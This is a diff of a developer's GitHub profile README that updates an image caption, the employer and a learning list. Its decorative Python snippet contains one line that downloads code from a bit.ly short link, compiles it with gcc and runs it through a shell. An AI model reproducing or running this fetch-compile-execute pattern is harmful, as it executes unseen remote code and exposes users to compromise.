@@ -1,6 +1,6 @@
 <h1 align="center">Yo 👋, I'm Pratik Pingale 👨‍💻</h1>
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=%2336BCF7&size=16&center=true&vCenter=true&width=485&lines=Just+a+novice.+Still+got+a+lot+to+learn.;Competitive+Coding+%3Ap;Loves+Open+Source+%E2%9D%A4%EF%B8%8F" alt="Just a novice. Still got a lot to learn." />
+  <img src="https://readme-typing-svg.herokuapp.com?color=%2336BCF7&size=16&center=true&vCenter=true&width=485&lines=Just+a+novice.+Still+got+a+lot+to+learn.;Competitive+Coding+%3Ap;Loves+Open+Source+%E2%9D%A4%EF%B8%8F" alt="Just a novice. Still got a lot to learn. Competitive Coding :p. Loves Open Source ❤️" />
 </p>
 
 ```python
@@ -8,11 +8,11 @@ class PROxZIMA:
   def __init__(self):
     subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
-      '- 💼 I’m currently working for': {'Convin.ai' : 'https://convin.ai'},
+      '- 💼 I’m currently working for': {'Emerson' : 'https://www.emerson.com/en-us/global'},
       '- 🔭 I’m currently working on' : {'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
                                          'Prism'     : 'https://github.com/PROxZIMA/prism',
                                          'Sweet-Pop' : 'https://github.com/PROxZIMA/Sweet-Pop'},
-      '- 🌱 I’m currently learning'   : ['Django', 'C++', 'Python', 'Full Stack Development', 'Algo Trading'],
+      '- 🌱 I’m currently learning'   : ['System Architecture', 'C++', 'Full Stack Development', 'Algo Trading'],
       '- 💬 Ask me anything'          : '¯\_(ツ)_/¯',
       '- 👨‍💻 My projects available at' : 'https://github.com/PROxZIMA?tab=repositories',
       '- 📄 Know about my experiences': 'https://proxzima.dev/resume',
